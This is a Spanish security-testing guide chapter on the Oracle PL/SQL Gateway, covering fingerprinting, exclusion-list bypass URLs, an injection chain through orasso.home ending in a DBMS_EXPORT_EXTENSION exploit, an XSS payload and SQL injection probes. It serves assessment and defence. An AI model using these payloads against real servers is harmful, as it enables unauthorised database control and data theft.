# Pruebas para Oracle

## Resumen

Las aplicaciones web basadas en PL/SQL están habilitadas por la PL/SQL Gateway, que es el componente que traduce las solicitudes web en consultas de base de datos. Oracle ha desarrollado una serie de implementaciones de software, desde el producto temprano de web listener hasta el módulo Apache `mod_plsql` hasta el servidor web XML Database (XDB). Todas tienen sus propias peculiaridades y problemas, cada uno de los cuales se investigará a fondo en este capítulo. Los productos que utilizan la PL/SQL Gateway incluyen, entre otros, el Oracle HTTP Server, eBusiness Suite, Portal, HTMLDB, WebDB y Oracle Application Server.

## Cómo Probar

### Cómo Funciona la PL/SQL Gateway

Esencialmente, la PL/SQL Gateway actúa simplemente como un servidor proxy que toma la solicitud web del usuario y la pasa al servidor de base de datos donde se ejecuta.

1. El servidor web acepta una solicitud de un cliente web y determina si debe ser procesada por la PL/SQL Gateway.
2. La PL/SQL Gateway procesa la solicitud extrayendo el nombre del paquete solicitado, el procedimiento y las variables.
3. El paquete y procedimiento solicitados se envuelven en un bloque de PL/SQL anónimo y se envían al servidor de base de datos.
4. El servidor de base de datos ejecuta el procedimiento y envía los resultados de vuelta a la Gateway como HTML.
5. La gateway envía la respuesta, a través del servidor web, de vuelta al cliente.

Comprender este punto es importante: el código PL/SQL no existe en el servidor web, sino en el servidor de base de datos. Esto significa que cualquier debilidad en la PL/SQL Gateway o cualquier debilidad en la aplicación PL/SQL, cuando se explota, da a un atacante acceso directo al servidor de base de datos; ninguna cantidad de firewalls lo impedirá.

Las URLs para aplicaciones web PL/SQL normalmente son fácilmente reconocibles y generalmente comienzan con lo siguiente (xyz puede ser cualquier cadena y representa un Descriptor de Acceso a Base de Datos, sobre el que aprenderá más adelante):

- `https://www.example.com/pls/xyz`
- `https://www.example.com/xyz/owa`
- `https://www.example.com/xyz/plsql`

Mientras que el segundo y tercero de estos ejemplos representan URLs de versiones anteriores de la PL/SQL Gateway, el primero es de versiones más recientes ejecutándose en Apache. En el archivo de configuración de Apache plsql.conf, /pls es el predeterminado, especificado como una Location con el módulo PLS como el manejador. La ubicación no necesita ser /pls, sin embargo. La ausencia de una extensión de archivo en una URL podría indicar la presencia de la Oracle PL/SQL Gateway. Considere la siguiente URL:

`https://www.server.com/aaa/bbb/xxxxx.yyyyy`

Si `xxxxx.yyyyy` se reemplazara con algo como `ebank.home`, `store.welcome`, `auth.login` o `books.search`, entonces hay una posibilidad bastante fuerte de que se esté utilizando la PL/SQL Gateway. También es posible preceder el paquete y procedimiento solicitados con el nombre del usuario que lo posee - es decir, el esquema - en este caso el usuario es `webuser`:

`https://www.server.com/pls/xyz/webuser.pkg.proc`

En esta URL, xyz es el Descriptor de Acceso a Base de Datos, o DAD. Un DAD especifica información sobre el servidor de base de datos para que la PL/SQL Gateway pueda conectarse. Contiene información como la cadena de conexión TNS, el ID de usuario y contraseña, métodos de autenticación, etc. Estos DAD se especifican en el archivo de configuración de Apache `dads.conf` en versiones más recientes o en el archivo `wdbsvr.app` en versiones anteriores. Algunos DAD predeterminados incluyen los siguientes:

```txt
SIMPLEDAD
HTMLDB
ORASSO
SSODAD
PORTAL
PORTAL2
PORTAL30
PORTAL30_SSO
TEST
DAD
APP
ONLINE
DB
OWA
```

#### Determinando si la PL/SQL Gateway Está Ejecutándose

Al realizar una evaluación contra un servidor, es importante primero saber con qué tecnología estás tratando realmente. Si no lo sabes ya, por ejemplo, en un escenario de evaluación de caja negra, entonces lo primero que necesitas hacer es resolver esto. Reconocer una aplicación web basada en PL/SQL es bastante fácil. Primero, está el formato de la URL y cómo se ve, discutido arriba. Más allá de eso, hay un conjunto de pruebas simples que se pueden realizar para probar la existencia de la PL/SQL Gateway.

#### Encabezados de Respuesta del Servidor

Los encabezados de respuesta del servidor web son un buen indicador de si el servidor está ejecutando la PL/SQL Gateway. La tabla a continuación enumera algunos de los encabezados de respuesta típicos del servidor:

```text
Oracle-Application-Server-10g
Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server
Oracle-Application-Server-10g/9.0.4.1.0 Oracle-HTTP-Server
Oracle-Application-Server-10g OracleAS-Web-Cache-10g/9.0.4.2.0 (N)
Oracle-Application-Server-10g/9.0.4.0.0
Oracle HTTP Server Powered by Apache
Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3a
Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3d
Oracle HTTP Server Powered by Apache/1.3.12 (Unix) mod_plsql/3.0.9.8.5e
Oracle HTTP Server Powered by Apache/1.3.12 (Win32) mod_plsql/3.0.9.8.5e
Oracle HTTP Server Powered by Apache/1.3.19 (Win32) mod_plsql/3.0.9.8.3c
Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/3.0.9.8.3b
Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0
Oracle_Web_Listener/4.0.7.1.0EnterpriseEdition
Oracle_Web_Listener/4.0.8.2EnterpriseEdition
Oracle_Web_Listener/4.0.8.1.0EnterpriseEdition
Oracle_Web_listener3.0.2.0.0/2.14FC1
Oracle9iAS/9.0.2 Oracle HTTP Server
Oracle9iAS/9.0.3.1 Oracle HTTP Server
```

#### La Prueba NULL

En PL/SQL, `null` es una expresión perfectamente aceptable:

```sql
SQL> BEGIN
  NULL;
  END;
  /
PL/SQL procedure successfully completed.
```

Podemos usar esto para probar si el servidor está ejecutando la PL/SQL Gateway. Simplemente toma el `DAD` y agrega `NULL`, luego agrega `NOSUCHPROC`:

- `https://www.example.com/pls/dad/null`
- `https://www.example.com/pls/dad/nosuchproc`

Si el servidor responde con una respuesta `200 OK` para la primera y una `404 Not Found` para la segunda, entonces indica que el servidor está ejecutando la PL/SQL Gateway.

#### Acceso a Paquetes Conocidos

En versiones anteriores de la PL/SQL Gateway, es posible acceder directamente a los paquetes que forman el PL/SQL Web Toolkit como los paquetes OWA y HTP. Uno de estos paquetes es el paquete `OWA_UTIL`, del que hablaremos más tarde. Este paquete contiene un procedimiento llamado SIGNATURE y simplemente genera en HTML una firma PL/SQL. Por lo tanto, solicitar

`https://www.example.com/pls/dad/owa_util.signature`

devuelve la siguiente salida en la página web

`"This page was produced by the PL/SQL Web Toolkit on date"`

o

`"This page was produced by the PL/SQL Cartridge on date"`

Si no obtiene esta respuesta pero una respuesta 403 Forbidden, entonces puede inferir que la PL/SQL Gateway está ejecutándose. Esta es la respuesta que debería obtener en versiones posteriores o sistemas parcheados.

#### Accediendo a Paquetes PL/SQL Arbitrarios en la Base de Datos

Es posible explotar vulnerabilidades en los paquetes PL/SQL que están instalados por defecto en el servidor de base de datos. Cómo hacerlo depende de la versión de la PL/SQL Gateway. En versiones anteriores de la PL/SQL Gateway, no había nada que impidiera a un atacante acceder a un paquete PL/SQL arbitrario en el servidor de base de datos. Mencionamos el paquete `OWA_UTIL` anteriormente. Este se puede usar para ejecutar consultas SQL arbitrarias:

`https://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT? P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS`

Los ataques de Scripting entre Sitios (XSS) podrían lanzarse a través del paquete HTP:

`https://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>`

Claramente, esto es peligroso, por lo que Oracle introdujo una lista de exclusión PLSQL para prevenir el acceso directo a tales procedimientos peligrosos. Los elementos prohibidos incluyen cualquier solicitud que comience con `SYS.*`, cualquier solicitud que comience con `DBMS_*`, cualquier solicitud con `HTP.*` o `OWA*`. Es posible eludir la lista de exclusión, sin embargo. Además, la lista de exclusión no previene el acceso a paquetes en los esquemas `CTXSYS` y `MDSYS` u otros, por lo que es posible explotar fallos en estos paquetes:

`https://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL`

Esto devolverá una página HTML en blanco con una respuesta 200 OK si el servidor de base de datos sigue siendo vulnerable a este fallo (CVE-2006-0265)

### Probando la PL/SQL Gateway por Fallos

A lo largo de los años, la Oracle PL/SQL Gateway ha sufrido una serie de fallos, incluyendo acceso a páginas de administración (CVE-2002-0561), desbordamientos de búfer (CVE-2002-0559), bugs de traversal de directorio, y vulnerabilidades que permiten a los atacantes eludir la Lista de Exclusión y proceder a acceder y ejecutar paquetes PL/SQL arbitrarios en el servidor de base de datos.

### Eludiendo la Lista de Exclusión PL/SQL

Es increíble cuántas veces Oracle ha intentado arreglar fallos que permiten a los atacantes eludir la lista de exclusión. Cada parche que Oracle ha producido ha caído víctima de una nueva técnica de elusión. [La historia de esta lamentable historia](https://seclists.org/fulldisclosure/2006/Feb/11)

### Eludiendo la Lista de Exclusión - Método 1

Cuando Oracle introdujo por primera vez la Lista de Exclusión PL/SQL para prevenir que los atacantes accedieran a paquetes PL/SQL arbitrarios, podía ser trivialmente eludida precediendo el nombre del esquema/paquete con un carácter de nueva línea codificado en hex o espacio o tab:

```txt
https://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC
https://www.example.com/pls/dad/%20SYS.PACKAGE.PROC
https://www.example.com/pls/dad/%09SYS.PACKAGE.PROC
```

### Eludiendo la Lista de Exclusión - Método 2

Versiones posteriores de la Gateway permitían a los atacantes eludir la lista de exclusión precediendo el nombre del esquema/paquete con una etiqueta. En PL/SQL una etiqueta apunta a una línea de código a la que se puede saltar usando la declaración GOTO y toma la siguiente forma: `<<NAME>>`

- `https://www.example.com/pls/dad/<<LBL>>SYS.PACKAGE.PROC`

### Eluyendo la Lista de Exclusión - Método 3

Simplemente colocando el nombre del esquema/paquete entre comillas dobles podría permitir a un atacante eludir la lista de exclusión. Tenga en cuenta que esto no funcionará en Oracle Application Server 10g ya que convierte la solicitud del usuario a minúsculas antes de enviarla al servidor de base de datos y un literal de comilla es sensible a mayúsculas - así `SYS` y `sys` no son lo mismo y las solicitudes para el último resultarán en un 404 Not Found. En versiones anteriores, sin embargo, lo siguiente puede eludir la lista de exclusión:

`https://www.example.com/pls/dad/"SYS".PACKAGE.PROC`

### Eluyendo la Lista de Exclusión - Método 4

Dependiendo del conjunto de caracteres en uso en el servidor web y en el servidor de base de datos, algunos caracteres se traducen. Por lo tanto, dependiendo de los conjuntos de caracteres en uso, el carácter `ÿ` (`0xFF`) podría convertirse a una `Y` en el servidor de base de datos. Otro carácter que a menudo se convierte a una `Y` mayúscula es el carácter Macron - `0xAF`. Esto puede permitir a un atacante eludir la lista de exclusión:

`https://www.example.com/pls/dad/S%FFS.PACKAGE.PROC`
`https://www.example.com/pls/dad/S%AFS.PACKAGE.PROC`

### Eluyendo la Lista de Exclusión - Método 5

Algunas versiones de la PL/SQL Gateway permiten que la lista de exclusión sea eludida con una barra invertida - `0x5C`:

`https://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC`

### Eluyendo la Lista de Exclusión - Método 6

Este es el método más complejo de eludir la lista de exclusión y es el método parcheado más recientemente. Si solicitáramos lo siguiente

`https://www.example.com/pls/dad/foo.bar?xyz=123`

el servidor de aplicaciones ejecutaría lo siguiente en el servidor de base de datos:

```sql
declare
 rc__ number;
 start_time__ binary_integer;
 simple_list__ owa_util.vc_arr;
 complex_list__ owa_util.vc_arr;
begin
 start_time__ := dbms_utility.get_time;
 owa.init_cgi_env(:n__,:nm__,:v__);
 htp.HTBUF_LEN := 255;
 null;
 null;
 simple_list__(1) := 'sys.%';
 simple_list__(2) := 'dbms\_%';
 simple_list__(3) := 'utl\_%';
 simple_list__(4) := 'owa\_%';
 simple_list__(5) := 'owa.%';
 simple_list__(6) := 'htp.%';
 simple_list__(7) := 'htf.%';
 if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then
  rc__ := 2;
 else
  null;
  orasso.wpg_session.init();
  foo.bar(XYZ=>:XYZ);
  if (wpg_docload.is_file_download) then
   rc__ := 1;
   wpg_docload.get_download_file(:doc_info);
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
  else
   rc__ := 0;
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
   owa.get_page(:data__,:ndata__);
  end if;
 end if;
 :rc__ := rc__;
 :db_proc_time__ := dbms_utility.get_time—start_time__;
end;
```

Observe las líneas 19 y 24. En la línea 19, la solicitud del usuario se verifica contra una lista de cadenas "malas" conocidas, es decir, la lista de exclusión. Si el paquete y procedimiento solicitados no contienen cadenas malas, entonces el procedimiento se ejecuta en la línea 24. El parámetro XYZ se pasa como una variable de enlace.

Si luego solicitamos lo siguiente:

`https://server.example.com/pls/dad/INJECT'POINT`

el siguiente PL/SQL se ejecuta:

```sql
..
simple_list__(7) := 'htf.%';
if ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 inject'point;
..
```

Esto genera un error en el registro de errores: "PLS-00103: Encountered the symbol 'POINT' when expecting one of the following. . ." Lo que tenemos aquí es una forma de inyectar SQL arbitrario. Esto se puede explotar para eludir la lista de exclusión. Primero, el atacante necesita encontrar un procedimiento PL/SQL que no tome parámetros y no coincida con nada en la lista de exclusión. Hay un buen número de paquetes predeterminados que coinciden con este criterio, por ejemplo:

```txt
JAVA_AUTONOMOUS_TRANSACTION.PUSH
XMLGEN.USELOWERCASETAGNAMES
PORTAL.WWV_HTP.CENTERCLOSE
ORASSO.HOME
WWC_VERSION.GET_HTTP_DATABASE_INFO
```

Un atacante debería elegir uno de estos funciones que esté realmente disponible en el sistema objetivo (es decir, devuelve un `200 OK` cuando se solicita). Como prueba, un atacante puede solicitar

`https://server.example.com/pls/dad/orasso.home?FOO=BAR`

el servidor debería devolver una respuesta `404 File Not Found` porque el procedimiento orasso.home no requiere parámetros y se ha proporcionado uno. Sin embargo, antes de que se devuelva el 404, se ejecuta el siguiente PL/SQL:

```sql
..
..
if ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 orasso.home(FOO=>:FOO);
..
..
```

Observe la presencia de FOO en la cadena de consulta del atacante. Los atacantes pueden abusar de esto para ejecutar SQL arbitrario. Primero, necesitan cerrar los paréntesis:

`https://server.example.com/pls/dad/orasso.home?);--=BAR`

Esto resulta en que se ejecute el siguiente PL/SQL:

```sql
..
orasso.home();--=>:);--);
..
```

Observe que todo después del doble menos (`--`) se trata como un comentario. Esta solicitud causará un error interno del servidor porque una de las variables de enlace ya no se usa, por lo que el atacante necesita agregarla de vuelta. Como sucede, es esta variable de enlace la clave para ejecutar PL/SQL arbitrario. Por el momento, pueden usar `HTP.PRINT` para imprimir BAR, y agregar la variable de enlace necesaria como :1:

`https://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR`

Esto debería devolver un `200` con la palabra "BAR" en el HTML. Lo que está sucediendo aquí es que todo después del signo igual - BAR en este caso - es los datos insertados en la variable de enlace. Usando la misma técnica es posible también ganar acceso a `owa_util.cellsprint` nuevamente:

`https://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS`

Para ejecutar SQL arbitrario, incluyendo declaraciones DML y DDL, el atacante inserta un execute immediate :1:

`https://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual`

Observe que la salida no se mostrará. Esto se puede aprovechar para explotar cualquier bug de inyección PL/SQL propiedad de SYS, permitiendo así a un atacante ganar control completo del servidor de base de datos backend. Por ejemplo, la siguiente URL aprovecha las fallas de inyección SQL en `DBMS_EXPORT_EXTENSION`

```txt
https://www.example.com/pls/dad/orasso.home?);
execute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20
BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20
PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';
END;--','SYS',1,'VER',0);END;
```

### Evaluando Aplicaciones Web PL/SQL Personalizadas

Durante evaluaciones de seguridad de caja negra, el código de la aplicación PL/SQL personalizada no está disponible, pero aún necesita ser evaluada por vulnerabilidades de seguridad.

#### Probando por Inyección SQL

Cada parámetro de entrada debería ser probado por fallas de inyección SQL. Estas son fáciles de encontrar y confirmar. Encontrarlas es tan fácil como incrustar una comilla simple en el parámetro y verificar respuestas de error (que incluyen errores 404 Not Found). Confirmar la presencia de inyección SQL se puede realizar usando el operador de concatenación.

Por ejemplo, asuma que hay una aplicación web de librería PL/SQL que permite a los usuarios buscar libros por un autor dado:

`https://www.example.com/pls/bookstore/books.search?author=DICKENS`

Si esta solicitud devuelve libros de Charles Dickens, pero

`https://www.example.com/pls/bookstore/books.search?author=DICK'ENS`

devuelve un error o un `404`, entonces podría haber una falla de inyección SQL. Esto se puede confirmar usando el operador de concatenación:

`https://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS`

Si esta solicitud devuelve libros de Charles Dickens, ha confirmado la presencia de la vulnerabilidad de inyección SQL.

## Herramientas

- [Orascan (Oracle Web Application VA scanner), NGS SQuirreL (Oracle RDBMS VA Scanner)](https://www.nccgroup.trust/globalassets/service-pages/documents/security-consulting/information-security-software/ncc-squirrel-suite.pdf)

## Referencias

### Documentos Blancos

- [Hackproofing Oracle Application Server (A Guide to Securing Oracle 9)](https://www.blackhat.com/presentations/win-usa-02/litchfield-winsec02.pdf)
- [Oracle PL/SQL Injection](https://www.oracle.com/technetwork/database/features/plsql/overview/how-to-write-injection-proof-plsql-1-129572.pdf)